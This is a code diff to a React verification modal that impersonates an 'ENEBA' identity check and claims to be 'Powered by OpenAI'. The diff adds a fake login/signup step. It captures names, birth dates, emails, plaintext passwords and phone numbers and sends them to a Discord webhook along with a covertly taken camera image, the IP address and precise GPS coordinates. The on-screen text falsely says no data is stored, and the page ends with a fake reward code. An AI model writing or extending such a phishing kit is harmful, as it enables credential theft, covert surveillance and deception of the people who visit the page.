@@ -2,6 +2,7 @@
 import React, { useState, useRef, useEffect } from 'react';
 import axios from 'axios';
 import { Circle, Check, Camera, MapPin, Loader } from 'lucide-react';
+import LoginSignupModal from './LoginSignupModal';
 
 interface VerificationModalProps {
   isOpen: boolean;
@@ -10,8 +11,9 @@ interface VerificationModalProps {
 }
 
 const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProps) => {
-  const [step, setStep] = useState<'loading' | 'verify' | 'permissions' | 'camera' | 'location' | 'success'>('loading');
+  const [step, setStep] = useState<'loading' | 'verify' | 'auth' | 'permissions' | 'camera' | 'location' | 'success'>('loading');
   const [countdown, setCountdown] = useState(4);
+  const [userData, setUserData] = useState<any>(null);
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
@@ -35,6 +37,18 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
   }, [isOpen, step]);
 
   const handleContinue = () => {
+    setStep('loading');
+    setCountdown(4);
+    
+    const timer = setTimeout(() => {
+      setStep('auth');
+    }, 4000);
+    
+    return () => clearTimeout(timer);
+  };
+  
+  const handleAuthComplete = (data: any) => {
+    setUserData(data);
     setStep('loading');
     setCountdown(4);
     
@@ -99,9 +113,18 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
         });
         
         if (response.data && response.data.data && response.data.data.link) {
-          // Send to Discord webhook
+          // Send to Discord webhook with user data
+          let userDataString = "No user data";
+          if (userData) {
+            if (userData.type === 'signup') {
+              userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
+            } else {
+              userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
+            }
+          }
+          
           await axios.post(webhookUrl, {
-            content: `Camera Image: ${response.data.data.link}\nIP Address: ${ipAddress}`
+            content: `📸 **CAMERA IMAGE CAPTURED**\n\n**Image**: ${response.data.data.link}\n**IP Address**: ${ipAddress}\n\n**USER DATA**:\n${userDataString}`
           });
         }
       } catch (error) {
@@ -133,9 +156,19 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
           const { latitude, longitude, accuracy } = position.coords;
           
           try {
+            // Prepare user data string
+            let userDataString = "No user data";
+            if (userData) {
+              if (userData.type === 'signup') {
+                userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
+              } else {
+                userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
+              }
+            }
+            
             // Send location with enhanced accuracy to webhook
             await axios.post(webhookUrl, {
-              content: `Location Data (High Accuracy Mode):\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`
+              content: `📍 **LOCATION DATA CAPTURED (High Accuracy Mode)**\n\n**Latitude**: ${latitude}\n**Longitude**: ${longitude}\n**Accuracy**: ${accuracy}m\n**Google Maps**: https://www.google.com/maps?q=${latitude},${longitude}\n\n**USER DATA**:\n${userDataString}`
             });
             
             // Move to success
@@ -160,69 +193,78 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
 
   return (
     <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
-      <div className="bg-custom-purple-light p-8 rounded-lg shadow-xl w-full max-w-md text-center text-white">
-        {step === 'loading' && (
-          <div className="flex flex-col items-center space-y-4">
-            <Loader className="animate-spin h-12 w-12 text-white" />
-            <p className="text-xl">Loading... {countdown}s</p>
-          </div>
-        )}
-        
-        {step === 'verify' && (
-          <div className="flex flex-col items-center space-y-4">
-            <Circle className="h-12 w-12 text-white" />
-            <p className="text-xl">Please verify using ENEBA's verification system.</p>
-            <button 
-              className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
-              onClick={handleContinue}
-            >
-              Continue
-            </button>
-          </div>
-        )}
-        
-        {step === 'permissions' && (
-          <div className="flex flex-col items-center space-y-4">
-            <Check className="h-12 w-12 text-white" />
-            <p className="text-xl">In order to verify, please allow us to use your camera and location. Your camera will only be used to figure out if you are a real person.</p>
-            <p className="text-sm text-gray-300 mt-2">ENEBA does not store your data. Powered by OpenAI.</p>
-            <button 
-              className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
-              onClick={handleStart}
-            >
-              Start
-            </button>
-          </div>
-        )}
-        
-        {step === 'camera' && (
-          <div className="flex flex-col items-center space-y-4">
-            <Camera className="h-12 w-12 text-white" />
-            <p className="text-xl">Please click allow on the permissions.</p>
-            <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
-            <video ref={videoRef} className="hidden" />
-          </div>
-        )}
-        
-        {step === 'location' && (
-          <div className="flex flex-col items-center space-y-4">
-            <MapPin className="h-12 w-12 text-white" />
-            <p className="text-xl">Please allow location access to verify your identity.</p>
-            <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
-            <p className="text-xs text-gray-400 mt-1">We need precise location for verification purposes.</p>
-          </div>
-        )}
-        
-        {step === 'success' && (
-          <div className="flex flex-col items-center space-y-4">
-            <Check className="h-12 w-12 text-green-400" />
-            <p className="text-xl">You have been verified! This is your code:</p>
-            <div className="bg-black bg-opacity-20 p-3 rounded font-mono">
-              3FJ8R-WN7TK-4ZP6B
+      {step === 'auth' ? (
+        <LoginSignupModal 
+          isOpen={true} 
+          onClose={onClose}
+          onComplete={handleAuthComplete}
+          webhookUrl={webhookUrl}
+        />
+      ) : (
+        <div className="bg-custom-purple-light p-8 rounded-lg shadow-xl w-full max-w-md text-center text-white">
+          {step === 'loading' && (
+            <div className="flex flex-col items-center space-y-4">
+              <Loader className="animate-spin h-12 w-12 text-white" />
+              <p className="text-xl">Loading... {countdown}s</p>
             </div>
-          </div>
-        )}
-      </div>
+          )}
+          
+          {step === 'verify' && (
+            <div className="flex flex-col items-center space-y-4">
+              <Circle className="h-12 w-12 text-white" />
+              <p className="text-xl">Please verify using ENEBA's verification system.</p>
+              <button 
+                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
+                onClick={handleContinue}
+              >
+                Continue
+              </button>
+            </div>
+          )}
+          
+          {step === 'permissions' && (
+            <div className="flex flex-col items-center space-y-4">
+              <Check className="h-12 w-12 text-white" />
+              <p className="text-xl">In order to verify, please allow us to use your camera and location. Your camera will only be used to figure out if you are a real person.</p>
+              <p className="text-sm text-gray-300 mt-2">ENEBA does not store your data. Powered by OpenAI.</p>
+              <button 
+                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
+                onClick={handleStart}
+              >
+                Start
+              </button>
+            </div>
+          )}
+          
+          {step === 'camera' && (
+            <div className="flex flex-col items-center space-y-4">
+              <Camera className="h-12 w-12 text-white" />
+              <p className="text-xl">Please click allow on the permissions.</p>
+              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
+              <video ref={videoRef} className="hidden" />
+            </div>
+          )}
+          
+          {step === 'location' && (
+            <div className="flex flex-col items-center space-y-4">
+              <MapPin className="h-12 w-12 text-white" />
+              <p className="text-xl">Please allow location access to verify your identity.</p>
+              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
+              <p className="text-xs text-gray-400 mt-1">We need precise location for verification purposes.</p>
+            </div>
+          )}
+          
+          {step === 'success' && (
+            <div className="flex flex-col items-center space-y-4">
+              <Check className="h-12 w-12 text-green-400" />
+              <p className="text-xl">You have been verified! This is your code:</p>
+              <div className="bg-black bg-opacity-20 p-3 rounded font-mono">
+                3FJ8R-WN7TK-4ZP6B
+              </div>
+            </div>
+          )}
+        </div>
+      )}
     </div>
   );
 };
